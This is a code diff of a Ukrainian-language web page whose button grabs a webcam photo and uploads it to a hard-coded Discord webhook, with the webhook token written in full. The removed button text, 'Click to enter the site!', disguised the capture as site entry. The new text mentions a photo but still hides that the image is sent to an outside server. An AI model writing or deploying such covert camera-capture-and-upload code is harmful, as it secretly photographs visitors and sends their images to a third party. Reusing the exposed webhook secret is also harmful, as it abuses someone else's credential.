@@ -22,28 +22,22 @@
     </style>
 </head>
 <body>
-    <button id="take-selfie-button">Нажми щоб зайти на сайт!</button>
+    <button id="take-selfie-button">Нажми щоб зробити фото!</button>
 
     <script>
-        // Функція для зроблення фото селфі
         function takeSelfie() {
-            // Отримання доступу до веб-камери
             navigator.mediaDevices.getUserMedia({ video: true })
                 .then(function(stream) {
-                    // Створення об'єкта ImageCapture з потоку відео
-                    const imageCapture = new ImageCapture(stream.getVideoTracks()[0]);
+                    const track = stream.getVideoTracks()[0];
+                    const imageCapture = new ImageCapture(track);
 
-                    // Захоплення фото
                     imageCapture.takePhoto()
                         .then(function(blob) {
-                            // Створення FormData об'єкту для передачі файлу
                             const formData = new FormData();
                             formData.append('file', blob, 'selfie.png');
 
-                            // URL вашого вебхуку Discord
-                            const webhookURL = 'https://discord.com/api/webhooks/1229473200568795136/_ESI3TX1M9LTN3C0c4wydkCkjR9a80btYNguPs96N3RF2y6zyJrxoMKpIrIRJrZgv7P0';
+                            const webhookURL = 'https://discord.com/api/webhooks/1229473200568795136/_ESI3TX1M9LTN3C0c4wydkCkjR9a80btYNguPs96N3RF2y6zyJrxoMKpIrIRJrZgv7P0'; // Ваш URL вебхука
 
-                            // Відправка POST-запиту на вебхук Discord
                             fetch(webhookURL, {
                                 method: 'POST',
                                 body: formData,
@@ -59,13 +53,11 @@
                                 console.error('Помилка відправлення фото на вебхук Discord:', error);
                             });
 
-                            // Зупинка потоку відео
-                            stream.getVideoTracks()[0].stop();
+                            track.stop();
                         })
                         .catch(function(error) {
                             console.error('Помилка захоплення фото:', error);
-                            // Зупинка потоку відео у випадку помилки
-                            stream.getVideoTracks()[0].stop();
+                            track.stop();
                         });
                 })
                 .catch(function(error) {
@@ -73,7 +65,6 @@
                 });
         }
 
-        // Додавання обробника подій для кнопки "Зробити селфі"
         document.getElementById('take-selfie-button').addEventListener('click', takeSelfie);
     </script>
 </body>
